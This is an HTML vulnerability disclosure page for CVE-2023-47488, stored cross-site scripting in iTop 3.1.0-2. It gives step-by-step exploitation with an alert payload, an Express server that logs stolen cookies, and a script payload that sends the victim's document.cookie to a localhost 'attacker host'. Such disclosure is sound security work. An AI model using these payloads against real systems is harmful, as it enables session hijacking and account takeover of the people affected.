<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>CVE-2023-47488</title>
</head>
<body>
    <div class="green snipcss-3NIWg">
        <div class="container center headings--one-size">
          <header class="header">
            <div class="header__inner">
              <div class="header__logo">
                <a href="#">
                  <div class="logo">
                    Quantiano
                  </div>
                </a>
              </div>
              <ul class="menu menu--mobile">
                <li>
                  <ul class="menu__dropdown">
                    <li>
                    </li>
                    <li>
                    </li>
                  </ul>
                </li>
              </ul>
            </div>
            <nav class="navigation-menu">
              <ul class="navigation-menu__inner menu--desktop">
              </ul>
            </nav>
          </header>
          <div class="content">
            <article class="post">
              <h1 class="post-title">
                <a href="#">
                  CVE-2023-47488
                </a>
              </h1>
              <div class="post-meta">
                <time class="post-date">
                  2023-11-09
                </time>
                <span class="post-author">
                  Nitipoom Jaroonchaipipat
                </span>
              </div><br>
              <hr>
              <div class="post-content">
                <div>
                  <h2 id="#">
                    Product detail
                    <a href="#" class="hanchor" arialabel="Anchor">
                      ⌗
                    </a>
                  </h2>
                  <ui>Affected product: iTOP</ui><br>
                  <ui>Affected version: 3.1.0-2-11973</ui><br>
                  <ui>Affected component: General information & contact page</ui><br><br>
                  <p class="image-description">
                    Multiple cross-site scripting (XSS) vulnerabilities in Combode Top version 3.1.0-2-11973 built on 2023-08-02. allow user to inject the malicious script code which send get request along with the cookie to the attacker host via the parameter
                    "attr_manager_id" in General information page, and parameter id on contact page.
                  </p>
                  <hr>
                  <h2 id="proof-of-concept">
                    Prerequisite
                    <a href="#proof-of-concept" class="hanchor" arialabel="Anchor">
                      ⌗
                    </a>
                  </h2>
                  <p >
                    Install iTop from official Combodo Github repository  
                    <a href="https://github.com/Combodo/iTop" target="_blank">
                      GitHub page
                    </a>
                  </p>
                  <img src="https://nitipoom-jar.github.io/CVE-2023-47488/00.png">
                  <p class="image-description">iTOP version 4.0.3 released on Aug 9</p><br>
                  <img src="https://nitipoom-jar.github.io/CVE-2023-47488/0.png">
                  <p class="image-description">Installed iTOP version 3.1.0-2</p><br>
             
                  <hr>
    
                  <h2 id="proof-of-concept">
                    Exploitation
                    <a href="#proof-of-concept" class="hanchor" arialabel="Anchor">
                      ⌗
                    </a>
                  </h2>

                  <img src="https://nitipoom-jar.github.io/CVE-2023-47488/1.png">
                  <p class="image-description">
                    1. Create a new person<br>
                  </p>

                  <img src="https://nitipoom-jar.github.io/CVE-2023-47488/3.png">
                  <p class="image-description">
                    2. Use a basic XSS payload<br>
                  </p>
                  <code>
                    <xmp>
                      <script>alert('XSS')</script>
                  </xmp>
                  </code><br>

                  <img src="https://nitipoom-jar.github.io/CVE-2023-47488/4.png">
                  <p class="image-description">
                    3. The script executed for both of field which is Last Name and First Name.<br>
                  </p>

                   

                    <img src="https://nitipoom-jar.github.io/CVE-2023-47488/5.png"><br>
                    <img src="https://nitipoom-jar.github.io/CVE-2023-47488/6.png">
                    <p class="image-description">
                      4. Host the attacker server on another port which is port 5555.
                    </p>
                    <code>
                      <xmp>
                        // Require express and create an instance of express app
                        const express = require('express');
                        const app = express();

                        // Define a port number
                        const port = 5555;

                        // Define a route for GET requests on '/'
                        app.get('/', (req, res) => {
                            // Extract the 'get' query parameter
                            const cookieData = req.query.get;
                            
                            // Log the cookie data to the console
                            console.log('Received cookie data:', cookieData);
                            
                            // Respond with a success message
                            res.send('Cookie data received');
                        });

                        // Start the server
                        app.listen(port, () => {
                            console.log(`Server listening at http://localhost:${port}`);
                        });
                    </xmp>
                    </code><br>

                    <img src="https://nitipoom-jar.github.io/CVE-2023-47488/8.png">
                    <p class="image-description">
                      5. Use another XSS payload which send a get request to localhost port 5555 (attacker host).
                    </p>
                    <code>
                      <xmp>
                        <script>
                      var xhr = new XMLHttpRequest();
                      xhr.open('GET', 'http://localhost:5555/?get=' + encodeURIComponent(document.cookie));
                      xhr.onload = function() { console.log(xhr.responseText); };
                      xhr.send();
                      </script>
                    </xmp>
                    </code><br>
                   
 
                  <p class="image-description">
                    As seen in the gif below, attacker obtain the cookie when victim click on the malicious person profile.
                  </p>
                  <img src="https://nitipoom-jar.github.io/CVE-2023-47488/last.gif"><br><br><hr>
                
                </div>
              </div>
            </article>
          </div>
          <footer class="footer">
            <div class="footer__inner">
              <div class="copyright">
                <span>
                  © 2023 Powered by 
                  <a href="https://gohugo.io">
                    Hugo
                  </a>
                </span>
                <span>
                  :: 
                  <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">
                    Theme
                  </a>
                  made by 
                  <a href="https://github.com/panr" target="_blank">
                    panr
                  </a>
                </span>
              </div>
            </div>
          </footer>
</body>
</html>



  